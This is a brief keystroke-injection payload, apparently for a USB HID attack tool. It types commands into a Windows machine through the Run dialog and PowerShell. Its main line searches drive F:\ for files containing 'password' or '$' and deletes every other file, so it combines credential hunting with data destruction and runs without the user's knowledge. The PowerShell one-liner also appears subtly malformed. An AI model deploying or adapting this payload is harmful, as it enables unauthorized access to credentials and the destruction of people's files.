 
layout('us')
press("GUI r") 
delay(500) 
type("powershell\n")
delay(1000)
 
type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'temp' } | select name\n")
delay(500) 
type("cd $usbPath\n")
delay(500)
type('$ps=Get-ChildItem F:\ | Select FullName; for($i=0; $i -lt $ps.Length; $i++){$filevar = Get-Content $ps[$i].FullName | Where-Object {$_ -like "*$*"-or $_ -like "*password*"}if($filevar.length -eq 0){Remove-Item $ps[$i].FullName;}}\n')
delay(500)
type("exit\n")
